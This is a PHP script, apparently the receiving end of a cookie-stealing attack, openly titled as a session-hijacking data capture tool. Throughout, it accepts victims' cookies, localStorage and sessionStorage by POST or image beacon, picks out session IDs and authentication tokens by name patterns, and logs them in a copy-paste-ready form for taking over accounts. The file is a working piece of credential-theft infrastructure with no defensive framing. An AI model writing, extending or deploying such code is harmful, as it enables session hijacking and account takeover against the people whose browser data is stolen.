<?php
// device.php - ULTRA PRO SESSION HIJACKING DATA CAPTURE
$date = date('dMYHis');
$file = 'device_info.txt';
$cookieFile = 'cookies_detailed.txt';
$sessionFile = 'session_hijack.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = file_get_contents('php://input');
    $json = json_decode($data, true);
    
    if ($json) {
        // Parse cookies into individual key-value pairs
        $cookieString = $json['cookies'] ?? 'None';
        $cookieArray = [];
        $sessionIds = [];
        $authTokens = [];
        
        if ($cookieString !== 'None' && $cookieString !== 'No cookies available' && $cookieString !== 'No cookies') {
            $cookies = explode('; ', $cookieString);
            foreach ($cookies as $cookie) {
                if (strpos($cookie, '=') !== false) {
                    list($name, $value) = explode('=', $cookie, 2);
                    $cookieArray[$name] = $value;
                    
                    // Detect session IDs
                    $sessionPatterns = ['PHPSESSID', 'JSESSIONID', 'ASP.NET_SessionId', 'ASPSESSIONID', 
                                       'session', 'sid', 'sess', 'SESSION'];
                    foreach ($sessionPatterns as $pattern) {
                        if (stripos($name, $pattern) !== false) {
                            $sessionIds[$name] = $value;
                        }
                    }
                    
                    // Detect auth tokens
                    $authPatterns = ['token', 'auth', 'login', 'jwt', 'bearer', 'access', 'refresh', 'api'];
                    foreach ($authPatterns as $pattern) {
                        if (stripos($name, $pattern) !== false) {
                            $authTokens[$name] = $value;
                        }
                    }
                }
            }
        }
        
        // Extract localStorage
        $localStorage = $json['localStorage'] ?? [];
        
        // Extract sessionStorage
        $sessionStorage = $json['sessionStorage'] ?? [];
        
        // Create SESSION HIJACKING FILE (Most Important)
        $hijackLog = "\n" . str_repeat("=", 100) . "\n";
        $hijackLog .= "🚨 SESSION HIJACKING DATA CAPTURED - [$date]\n";
        $hijackLog .= str_repeat("=", 100) . "\n\n";
        
        // 1. RAW COOKIE STRING (For direct browser import)
        $hijackLog .= "📋 RAW COOKIE STRING (Copy-Paste Ready):\n";
        $hijackLog .= str_repeat("-", 100) . "\n";
        $hijackLog .= $cookieString . "\n\n";
        
        // 2. SESSION IDs
        if (!empty($sessionIds)) {
            $hijackLog .= "🔑 SESSION IDs (CRITICAL FOR HIJACKING):\n";
            $hijackLog .= str_repeat("-", 100) . "\n";
            foreach ($sessionIds as $name => $value) {
                $hijackLog .= sprintf("%-40s = %s\n", $name, $value);
            }
            $hijackLog .= "\n";
        }
        
        // 3. AUTH TOKENS
        if (!empty($authTokens)) {
            $hijackLog .= "🎫 AUTHENTICATION TOKENS:\n";
            $hijackLog .= str_repeat("-", 100) . "\n";
            foreach ($authTokens as $name => $value) {
                $hijackLog .= sprintf("%-40s = %s\n", $name, $value);
            }
            $hijackLog .= "\n";
        }
        
        // 4. ALL COOKIES (Individual)
        if (!empty($cookieArray)) {
            $hijackLog .= "🍪 ALL COOKIES (" . count($cookieArray) . " total):\n";
            $hijackLog .= str_repeat("-", 100) . "\n";
            foreach ($cookieArray as $name => $value) {
                $hijackLog .= sprintf("%-40s = %s\n", $name, $value);
            }
            $hijackLog .= "\n";
        }
        
        // 5. LOCAL STORAGE
        if (!empty($localStorage) && !isset($localStorage['error'])) {
            $hijackLog .= "💾 LOCAL STORAGE DATA:\n";
            $hijackLog .= str_repeat("-", 100) . "\n";
            foreach ($localStorage as $key => $value) {
                $hijackLog .= sprintf("%-40s = %s\n", $key, substr($value, 0, 200));
            }
            $hijackLog .= "\n";
        }
        
        // 6. SESSION STORAGE
        if (!empty($sessionStorage) && !isset($sessionStorage['error'])) {
            $hijackLog .= "🗄️ SESSION STORAGE DATA:\n";
            $hijackLog .= str_repeat("-", 100) . "\n";
            foreach ($sessionStorage as $key => $value) {
                $hijackLog .= sprintf("%-40s = %s\n", $key, substr($value, 0, 200));
            }
            $hijackLog .= "\n";
        }
        
        // 7. DEVICE & PAGE INFO
        $hijackLog .= "📱 CONTEXT INFORMATION:\n";
        $hijackLog .= str_repeat("-", 100) . "\n";
        $hijackLog .= sprintf("%-40s : %s\n", "User Agent", $json['userAgent'] ?? 'Unknown');
        $hijackLog .= sprintf("%-40s : %s\n", "Platform", $json['platform'] ?? 'Unknown');
        $hijackLog .= sprintf("%-40s : %s\n", "Current URL", $json['currentURL'] ?? 'Unknown');
        $hijackLog .= sprintf("%-40s : %s\n", "Referrer", $json['referrer'] ?? 'None');
        $hijackLog .= sprintf("%-40s : %s\n", "Timestamp", $json['timestamp'] ?? date('Y-m-d H:i:s'));
        $hijackLog .= "\n";
        
        // Save to SESSION HIJACKING file (Priority)
        file_put_contents($sessionFile, $hijackLog, FILE_APPEND);
        
        // Also save to main device file
        file_put_contents($file, $hijackLog, FILE_APPEND);
        
        // Save raw cookies
        if (!empty($cookieArray)) {
            $cookieLog = "\n[$date] RAW COOKIES:\n$cookieString\n\n";
            file_put_contents($cookieFile, $cookieLog, FILE_APPEND);
        }
        
        // Trigger notification
        file_put_contents("Log.log", "🚨 SESSION DATA CAPTURED!\n", FILE_APPEND);
        
        echo json_encode([
            'status' => 'success', 
            'cookies' => count($cookieArray),
            'sessions' => count($sessionIds),
            'tokens' => count($authTokens)
        ]);
    }
} elseif (isset($_GET['beacon'])) {
    // Image beacon fallback
    $cookieData = $_GET['cookies'] ?? 'None';
    $beaconLog = "\n[BEACON-$date] Cookies: $cookieData\n";
    file_put_contents($sessionFile, $beaconLog, FILE_APPEND);
    
    // Return 1x1 transparent GIF
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
}
?>
